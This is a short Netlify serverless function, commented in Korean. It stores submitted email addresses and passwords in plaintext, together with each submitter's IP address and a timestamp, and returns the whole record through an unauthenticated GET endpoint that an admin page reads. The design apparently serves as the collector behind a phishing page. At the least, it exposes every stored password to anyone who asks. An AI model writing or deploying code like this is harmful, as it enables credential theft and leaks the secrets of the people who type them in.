import { getStore } from "@netlify/blobs";

export default async (request, context) => {
  const store = getStore("submissions");

  // admin.html이 데이터 조회
  if (request.method === "GET") {
    const data =
      await store.get("data.json", {
        type: "json",
        consistency: "strong"
      }) || [];

    return Response.json(data);
  }

  // 사용자 제출
  if (request.method !== "POST") {
    return Response.json(
      { error: "허용되지 않는 요청입니다." },
      { status: 405 }
    );
  }

  try {
    const body = await request.json();

    const email = String(body.email ?? "");
    const password = String(body.password ?? "");

    if (!email || !password) {
      return Response.json(
        { error: "입력값이 없습니다." },
        { status: 400 }
      );
    }

    const data =
      await store.get("data.json", {
        type: "json",
        consistency: "strong"
      }) || [];

    data.push({
      ip: context.ip || "unknown",
      email,
      password,
      time: new Date().toISOString()
    });

    await store.setJSON("data.json", data);

    return Response.json({
      success: true
    });

  } catch (error) {
    console.error(error);

    return Response.json(
      { error: "서버 오류" },
      { status: 500 }
    );
  }
};